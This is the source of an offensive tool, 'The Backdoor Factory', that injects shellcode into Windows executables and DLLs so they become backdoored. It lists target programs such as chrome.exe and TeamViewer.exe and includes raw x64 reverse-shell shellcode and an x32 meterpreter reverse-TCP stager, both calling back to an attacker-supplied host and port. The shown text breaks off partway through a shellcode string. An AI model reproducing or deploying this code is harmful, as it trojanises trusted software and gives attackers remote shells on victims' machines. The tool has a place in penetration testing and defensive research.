#!/usr/bin/env python
'''
    The Backdoor Factory 1.0

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    Special thanks to Travis Morrow for poking holes in my ideas.

    Copyright (C) 2013, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 EXEs/DLLs only (intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''

import sys
import os
import struct
import shutil
import random
import signal
import platform
import stat
import time
import subprocess
from binascii import unhexlify
from optparse import OptionParser
from random import choice

#move verbose to flItms[]
global verbose
verbose = True

global flItms
flItms = {}


def signal_handler(signal, frame):
        print '\nProgram Exit'
        sys.exit(0)

#INJECTOR ITEMS:
#Data format DICT: {process_name_to_backdoor :
#                       [('dependencies to kill', ),
#                       'service to kill', restart=True/False],
#                       }
list_of_targets = {'chrome.exe':
                   [('chrome.exe', ), None, True],
                   'hamachi-2.exe':
                   [('hamachi-2.exe', ), "Hamachi2Svc", True],
                   'tcpview.exe': [('tcpview.exe',), None, True],
                   #'rpcapd.exe':
                   #[('rpcapd.exe'), None, False],
                   'psexec.exe':
                   [('psexec.exe',), 'PSEXESVC.exe', False],
                   'vncserver.exe':
                   [('vncserver.exe', ), 'vncserver', True],
                   # must append code cave for vmtoolsd.exe

                   'vmtoolsd.exe':
                   [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],

                   'nc.exe': [('nc.exe', ), None, False],

                   'Start Tor Browser.exe':
                   [('Start Tor Browser.exe', ), None, False],

                   'procexp.exe': [('procexp.exe',
                                    'procexp64.exe'), None, True],

                   'procmon.exe': [('procmon.exe',
                                    'procmon64.exe'), None, True],

                   'TeamViewer.exe': [('tv_x64.exe',
                                       'tv_x32.exe'), None, True]
                   }

#Machine Types

MachineTypes = {'0x0': 'AnyMachineType',
                '0x1d3': 'Matsushita AM33',
                '0x8664': 'x64',
                '0x1c0': 'ARM LE',
                '0x1c4': 'ARMv7',
                '0xaa64': 'ARMv8 x64',
                '0xebc': 'EFIByteCode',
                '0x14c': 'Intel x86',
                '0x200': 'Intel Itanium',
                '0x9041': 'M32R',
                '0x266': 'MIPS16',
                '0x366': 'MIPS w/FPU',
                '0x466': 'MIPS16 w/FPU',
                '0x1f0': 'PowerPC LE',
                '0x1f1': 'PowerPC w/FP',
                '0x166': 'MIPS LE',
                '0x1a2': 'Hitachi SH3',
                '0x1a3': 'Hitachi SH3 DSP',
                '0x1a6': 'Hitachi SH4',
                '0x1a8': 'Hitachi SH5',
                '0x1c2': 'ARM or Thumb -interworking',
                '0x169': 'MIPS little-endian WCE v2'
                }

#What is supported:
supported_types = ['Intel x86', 'x64']

#w00t!
author = """\
         Author:    Joshua Pitts
         Email:     the.midnite.runr[a t]gmail<d o t>com
         Twitter:   @midnite_runr
         """

#ASCII ART
menu = ["-.(`-')  (`-')  _           <-"
        ".(`-') _(`-')                            (`-')\n"
        "__( OO)  (OO ).-/  _         __( OO)"
        "( (OO ).->     .->        .->   <-.(OO )  \n"
        "'-'---.\  / ,---.   \-,-----.'-'. ,--"
        ".\    .'_ (`-')----. (`-')----. ,------,) \n"
        "| .-. (/  | \ /`.\   |  .--./|  .'   /"
        "'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \n"
        "| '-' `.) '-'|_.' | /_) (`-')|      /)"
        "|  |  ' |( _) | |  |( _) | |  ||  |_.' | \n"
        "| /`'.  |(|  .-.  | ||  |OO )|  .   ' |"
        "  |  / : \|  |)|  | \|  |)|  ||  .   .' \n"
        "| '--'  / |  | |  |(_'  '--'\|  |\   \|"
        "  '-'  /  '  '-'  '  '  '-'  '|  |\  \  \n"
        "`------'  `--' `--'   `-----'`--' '--'"
        "`------'    `-----'    `-----' `--' '--' \n"
        "           (`-')  _           (`-')     "
        "              (`-')                    \n"
        "   <-.     (OO ).-/  _        ( OO).-> "
        "      .->   <-.(OO )      .->           \n"
        "(`-')-----./ ,---.   \-,-----./    '._"
        "  (`-')----. ,------,) ,--.'  ,-.        \n"
        "(OO|(_\---'| \ /`.\   |  .--./|'--...__)"
        "( OO).-.  '|   /`. '(`-')'.'  /        \n"
        " / |  '--. '-'|_.' | /_) (`-')`--.  .--'"
        "( _) | |  ||  |_.' |(OO \    /         \n"
        " \_)  .--'(|  .-.  | ||  |OO )   |  |   "
        " \|  |)|  ||  .   .' |  /   /)         \n"
        "  `|  |_)  |  | |  |(_'  '--'\   |  |    "
        " '  '-'  '|  |\  \  `-/   /`          \n"
        "   `--'    `--' `--'   `-----'   `--'    "
        "  `-----' `--' '--'   `--'            \n",

        "__________               "
        " __       .___                   \n"
        "\______   \_____    ____ "
        "|  | __ __| _/____   ___________ \n"
        " |    |  _/\__  \ _/ ___\|"
        "  |/ // __ |/  _ \ /  _ \_  __ \ \n"
        " |    |   \ / __ \\\\  \__"
        "_|    </ /_/ (  <_> |  <_> )  | \/\n"
        " |______  /(____  /\___  >"
        "__|_ \____ |\____/ \____/|__|   \n"
        "        \/      \/     \/"
        "     \/    \/                    \n"
        "___________              "
        "__                               \n"
        "\_   _____/____    _____/"
        "  |_  ___________ ___.__.        \n"
        " |    __) \__  \ _/ ___\ "
        "  __\/  _ \_  __ <   |  |        \n"
        " |     \   / __ \\\\  \__"
        "_|  | (  <_> )  | \/\___  |        \n"
        " \___  /  (____  /\___  >_"
        "_|  \____/|__|   / ____|        \n"
        "     \/        \/     \/  "
        "                 \/             \n"]

# A couple NOPs
nops = [0x90, 0x3690, 0x6490, 0x6590, 0x6690, 0x6790]

# Some x64 OpCodes for tracking entry instructions
opcode64 = {'0x4881ec': 7,
            '0x4883c0': 4, '0x4883c1': 4, '0x4883c2': 4, '0x4883c3': 4,
            '0x4883c4': 4, '0x4883c5': 4, '0x4883c6': 4, '0x4883c7': 4,
            '0x4883c8': 4, '0x4883c9': 4, '0x4883ca': 4, '0x4883cb': 4,
            '0x4883cc': 4, '0x4883cd': 4, '0x4883ce': 4, '0x4883cf': 4,
            '0x4883d0': 4, '0x4883d1': 4, '0x4883d2': 4, '0x4883d3': 4,
            '0x4883d4': 4, '0x4883d5': 4, '0x4883d6': 4, '0x4883d7': 4,
            '0x4883d8': 4, '0x4883d9': 4, '0x4883da': 4, '0x4883db': 4,
            '0x4883dc': 4, '0x4883dd': 4, '0x4883de': 4, '0x4883df': 4,
            '0x4883e0': 4, '0x4883e1': 4, '0x4883e2': 4, '0x4883e3': 4,
            '0x4883e4': 4, '0x4883e5': 4, '0x4883e6': 4, '0x4883e7': 4,
            '0x4883e8': 4, '0x4883e9': 4, '0x4883ea': 4, '0x4883eb': 4,
            '0x4883ec': 4, '0x4883ed': 4, '0x4883ee': 4, '0x4883ef': 4,
            '0x4883f0': 4, '0x4883f1': 4, '0x4883f2': 4, '0x4883f3': 4,
            '0x4883f4': 4, '0x4883f5': 4, '0x4883f6': 4, '0x4883f7': 4,
            '0x4883f8': 4, '0x4883f9': 4, '0x4883fa': 4, '0x4883fb': 4,
            '0x4883fc': 4, '0x4883fd': 4, '0x4883fe': 4, '0x4883ff': 4,
            '0x488bc0': 3, '0x488bc1': 3, '0x488bc2': 3, '0x488bc3': 3,
            '0x488bc4': 3, '0x488bc5': 3, '0x488bc6': 3, '0x488bc7': 3,
            '0x488bc8': 3, '0x488bc9': 3, '0x488bca': 3, '0x488bcb': 3,
            '0x488bcc': 3, '0x488bcd': 3, '0x488bce': 3, '0x488bcf': 3,
            '0x488bd0': 3, '0x488bd1': 3, '0x488bd2': 3, '0x488bd3': 3,
            '0x488bd4': 3, '0x488bd5': 3, '0x488bd6': 3, '0x488bd7': 3,
            '0x488bd8': 3, '0x488bd9': 3, '0x488bda': 3, '0x488bdb': 3,
            '0x488bdc': 3, '0x488bdd': 3, '0x488bde': 3, '0x488bdf': 3,
            '0x488be0': 3, '0x488be1': 3, '0x488be2': 3, '0x488be3': 3,
            '0x488be4': 3, '0x488be5': 3, '0x488be6': 3, '0x488be7': 3,
            '0x488be8': 3, '0x488be9': 3, '0x488bea': 3, '0x488beb': 3,
            '0x488bec': 3, '0x488bed': 3, '0x488bee': 3, '0x488bef': 3,
            '0x488bf0': 3, '0x488bf1': 3, '0x488bf2': 3, '0x488bf3': 3,
            '0x488bf4': 3, '0x488bf5': 3, '0x488bf6': 3, '0x488bf7': 3,
            '0x488bf8': 3, '0x488bf9': 3, '0x488bfa': 3, '0x488bfb': 3,
            '0x488bfc': 3, '0x488bfd': 3, '0x488bfe': 3, '0x488bff': 3,
            '0x48895c': 5,
            }

# Some jmps
jump_codes = [int('0xe9', 16), int('0xeb', 16), int('0xea', 16)]


# x32 OpCodes
opcode32 = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
            '0x0104': 3, '0x0105': 6, '0x0106': 2, '0x0107': 2,
            '0x0108': 2, '0x0109': 2, '0x010a': 2, '0x010b': 2,
            '0x010c': 3, '0x010d': 6, '0x010e': 2, '0x010f': 2,
            '0x0110': 2, '0x0111': 2, '0x0112': 2, '0x0113': 2,
            '0x0114': 3, '0x0115': 6, '0x0116': 2, '0x0117': 2,
            '0x0118': 2, '0x0119': 2, '0x011a': 2, '0x011b': 2,
            '0x011c': 3, '0x011d': 6, '0x011e': 2, '0x011f': 2,
            '0x0120': 2, '0x0121': 2, '0x0122': 2, '0x0123': 2,
            '0x0124': 3, '0x0125': 6, '0x0126': 2, '0x0127': 2,
            '0x0128': 2, '0x0129': 2, '0x012a': 2, '0x012b': 2,
            '0x012c': 3, '0x012d': 6, '0x012e': 2, '0x012f': 2,
            '0x0130': 2, '0x0131': 2, '0x0132': 2, '0x0133': 2,
            '0x0134': 3, '0x0135': 6, '0x0136': 2, '0x0137': 2,
            '0x0138': 2, '0x0139': 2, '0x013A': 2, '0x013b': 2,
            '0x013c': 3, '0x013d': 6, '0x013e': 2, '0x013f': 2,
            '0x0140': 2, '0x0141': 3, '0x0142': 3, '0x0143': 3,
            '0x0144': 4, '0x0145': 3, '0x0146': 3, '0x0147': 3,
            '0x0148': 3, '0x0149': 3, '0x014a': 3, '0x014b': 3,
            '0x014c': 4, '0x014d': 3, '0x014e': 3, '0x014f': 3,
            '0x0150': 3, '0x0151': 3, '0x0152': 3, '0x0153': 3,
            '0x0154': 4, '0x0155': 3, '0x0156': 3, '0x0157': 3,
            '0x0158': 3, '0x0159': 3, '0x015a': 3, '0x015b': 3,
            '0x015c': 4, '0x015d': 3, '0x015e': 3, '0x015f': 3,
            '0x0160': 3, '0x0161': 3, '0x0162': 3, '0x0163': 3,
            '0x0164': 4, '0x0165': 3, '0x0166': 3, '0x0167': 3,
            '0x0168': 3, '0x0169': 3, '0x016a': 3, '0x016b': 3,
            '0x016c': 4, '0x016d': 3, '0x016e': 3, '0x016f': 3,
            '0x0170': 3, '0x0171': 3, '0x0172': 3, '0x0173': 3,
            '0x0174': 4, '0x0175': 3, '0x0176': 3, '0x0177': 3,
            '0x0178': 3, '0x0179': 3, '0x017a': 3, '0x017b': 3,
            '0x017c': 4, '0x017d': 3, '0x017e': 3, '0x017f': 3,
            '0x0180': 6, '0x0181': 6, '0x0182': 6, '0x0183': 6,
            '0x0184': 7, '0x0185': 6, '0x0186': 6, '0x0187': 6,
            '0x0188': 6, '0x0189': 6, '0x018a': 6, '0x0184': 6,
            '0x018c': 7, '0x018d': 6, '0x018e': 6, '0x018f': 6,
            '0x0190': 6, '0x0191': 6, '0x0192': 6, '0x0193': 6,
            '0x0194': 7, '0x0195': 6, '0x0196': 6, '0x0197': 6,
            '0x0198': 6, '0x0199': 6, '0x019a': 6, '0x019b': 6,
            '0x019c': 7, '0x019d': 6, '0x019e': 6, '0x019f': 6,
            '0x01a0': 6, '0x01a1': 6, '0x01a2': 6, '0x01a3': 6,
            '0x01a4': 7, '0x01a5': 6, '0x01a6': 6, '0x01a7': 6,
            '0x01a8': 6, '0x01a9': 6, '0x01aa': 6, '0x01ab': 6,
            '0x01ac': 7, '0x01ad': 6, '0x01ae': 6, '0x01af': 6,
            '0x01b0': 6, '0x01b1': 6, '0x01b2': 6, '0x01b3': 6,
            '0x01b4': 7, '0x01b5': 6, '0x01b6': 6, '0x01b7': 6,
            '0x01b8': 6, '0x01b9': 6, '0x01ba': 6, '0x01bb': 6,
            '0x01bc': 7, '0x01bd': 6, '0x01be': 6, '0x01bf': 6,
            '0x01c0': 2, '0x01c1': 2, '0x01c2': 2, '0x01c3': 2,
            '0x01c4': 2, '0x01c5': 2, '0x01c6': 2, '0x01c7': 2,
            '0x01c8': 2, '0x01c9': 2, '0x01ca': 2, '0x01cb': 2,
            '0x01cc': 2, '0x01cd': 2, '0x01ce': 2, '0x01cf': 2,
            '0x0f34': 2,
            '0x2b': 2,
            '40': 1, '0x41': 1, '0x42': 1, '0x43': 1,
            '0x44': 1, '0x45': 1, '0x46': 1, '0x47': 1,
            '0x48': 1, '0x49': 1, '0x4a': 1, '0x4b': 1,
            '0x4c': 1, '0x4d': 1, '0x4e': 1, '0x4f': 1,
            '0x50': 1, '0x51': 1, '0x52': 1, '0x53': 1,
            '0x54': 1, '0x55': 1, '0x56': 1, '0x57': 1,
            '0x58': 1, '0x59': 1, '0x5a': 1, '0x5b': 1,
            '0x5c': 1, '0x5d': 1, '0x5e': 1, '0x5f': 1,
            '0x60': 1, '0x61': 1, '0x6201': 2, '0x6202': 2,
            '0x6203': 2, '0x66': 1, '0x623a': 2,
            '0x6204': 3, '0x6205': 6, '0x6206': 2, '0x6207': 2,
            '0x6208': 2, '0x6209': 2, '0x620a': 2, '0x620b': 2,
            '0x620c': 3, '0x64a0': 6, '0x64a1': 6, '0x64a2': 6,
            '0x64a3': 6, '0x64a4': 2, '0x64a5': 2, '0x64a6': 2,
            '0x64a7': 2, '0x64a8': 3, '0x64a9': 6, '0x64aa': 2,
            '0x64ab': 2, '0x64ac': 2, '0x64ad': 2, '0x64ae': 2,
            '0x64af': 2,
            '0x6a': 2,
            '0x70': 2, '0x71': 2, '0x72': 2, '0x73': 2,
            '0x74': 2, '0x75': 2, '0x76': 2, '0x77': 2,
            '0x78': 2,
            '0x79': 2, '0x8001': 3, '0x8002': 3,
            '0x8b45': 3, '0x8945': 3, '0x837d': 4, '0x8be5': 2,
            '0x880a': 2, '0x8bc7': 2, '0x8bf4': 2, '0x893e': 2,
            '0x8965': 3, '0xff15': 6, '0x8b4e': 3, '0x8b46': 3,
            '0x8b76': 3, '0x8915': 6, '0x8b56': 3, '0x83f9': 3,
            '0x81ec': 6, '0x837d': 4, '0x8b5d': 3, '0x8b75': 3,
            '0x8b7d': 3, '0x83fe': 3, '0x8bff': 2, '0x83c4': 3,
            '0x83ec': 3, '0x8bec': 2, '0x8bf6': 2, '0x85c0': 2,
            '0x33c0': 2, '0x33c9': 2, '0x89e5': 2, '0x89ec': 3,
            '0x9c': 1,
            '0xc70424': 7, '0xc9': 1, '0xff25': 6,
            '0xff1410': 3, '0xff1490': 3, '0xff1450': 3,
            '0xe8': 5, '0x68': 5, '0xe9': 5,
            '0xbf': 5, '0xbe': 5,
            '0xcc': 1, '0xcd': 2,
            '0xffd3': 2,
            '0x33f6': 2,
            '0x895c24': 4, '0x8da424': 7, '0x8d4424': 4,
            '0xa1': 5, '0xa3': 5, '0xc3': 1,
            '0xeb': 2, '0xea': 7,
            }


def eat_code_caves(CavesPicked, caveone, cavetwo):
    try:
        if CavesPicked[cavetwo][0] == CavesPicked[caveone][0]:
            return int(CavesPicked[cavetwo][1], 16) - int(CavesPicked[caveone][1], 16)
        else:
            caveone_found = False
            cavetwo_found = False
            forward = True
            windows_memoffset_holder = 0
            for section in flItms['Sections']:
                if CavesPicked[caveone][0] == section[0] and caveone_found is False:
                    caveone_found = True
                    if cavetwo_found is False:
                        windows_memoffset_holder += section[1] + 4096 - section[1] % 4096 - section[3]
                        forward = True
                        continue
                    if section[1] % 4096 == 0:
                        continue
                    break

                if CavesPicked[cavetwo][0] == section[0] and cavetwo_found is False:
                    cavetwo_found = True
                    if caveone_found is False:
                        windows_memoffset_holder += -(section[1] + 4096 - section[1] % 4096 - section[3])
                        forward = False
                        continue
                    if section[1] % 4096 == 0:
                        continue
                    break

                if caveone_found is True or cavetwo_found is True:
                    if section[1] % 4096 == 0:
                            continue
                    if forward is True:
                        windows_memoffset_holder += section[1] + 4096 - section[1] % 4096 - section[3]
                    if forward is False:
                        windows_memoffset_holder += -(section[1] + 4096 - section[1] % 4096 - section[3])
                    continue

                #Need a way to catch all the sections in between other sections

            return int(CavesPicked[cavetwo][1], 16) - int(CavesPicked[caveone][1], 16) + windows_memoffset_holder

    except Exception, e:
        #print str(e)
        return 0


def ones_compliment():
    """
    Function for finding two random 4 byte numbers that make
    a 'ones compliment'
    """
    compliment_you = random.randint(1, 4228250625)
    compliment_me = int('0xFFFFFFFF', 16) - compliment_you
    if verbose is True:
        print "First ones compliment:", hex(compliment_you)
        print "2nd ones compliment:", hex(compliment_me)
        print "'AND' the compliments (0): ", compliment_you & compliment_me
    compliment_you = struct.pack('<I', compliment_you)
    compliment_me = struct.pack('<I', compliment_me)
    return compliment_you, compliment_me


def ByteToHex(byteStr):
    """
    Convert a byte string to it's hex string representation e.g. for output.
    """

    return ''.join(["%02X" % ord(x) for x in byteStr]).strip()


##########################################################
#               BEGIN win64 shellcodes                   #
##########################################################

class win64_shellcode():
    def __init__(self, HOST, PORT):
        self.HOST = HOST
        self.PORT = PORT
        self.shellcode = ""
        self.stackpreserve = ("\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.stackrestore = ("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             )

        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """
        breakupvar = eat_code_caves(CavesPicked, 0, 1)

        self.shellcode1 = ("\xfc"
                           "\x48\x83\xe4\xf0"
                           "\xe8")

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4)), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4)), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                                   len(self.stackpreserve) - len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xc0\x00\x00\x00"

        self.shellcode1 += ("\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff")

        self.shellcode2 = ("\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           "\x49\x89\xe5\x49\xbc\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            "\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            "\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            "\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)


##########################################################
#                 END win64 shellcodes                   #
##########################################################

##########################################################
#               BEGIN win32 shellcodes                   #
##########################################################

class win32_shellcode():
    """
    This class contains all the available shellcodes that
    are available for use.
    You can add your own, make sure you feed it ports/hosts as needed.
    Just follow the provided examples.
    """

    def __init__(self, HOST, PORT):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.shellcode = ""
        self.stackpreserve = "\x90\x90\x60\x9c"
        self.stackrestore = "\x9d\x61"

        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        Reverse tcp stager.  Can be used with windows/shell/reverse_tcp or
        windows/meterpreter/reverse_tcp payloads from metasploit.
        """

        flItms['stager'] = True

        breakupvar = eat_code_caves(CavesPicked, 0, 1)

        #shellcode1 is the thread
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE\x22\x01\x00\x00"  # <---Size of shellcode2 in hex
                           "\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                           "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                           "\x89\xF1"
                           )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4)), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4)), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"  # <--length of shellcode below
        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(CavesPicked, 0, 2)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4)), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4)), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)), 16))
        else:
            self.shellcode1 += "\xE9\x27\x01\x00\x00"

        #Begin shellcode 2:

        breakupvar = eat_code_caves(CavesPicked, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 241)), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 241)), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234)), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"
        #Can inject any shellcode below.

        self.shellcode2 += ("\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52"
                            "\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC"
                            "\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57\x8B"
                            "\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01\xD0"
                            "\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B\x01"
                            "\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03"
                            "\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C"
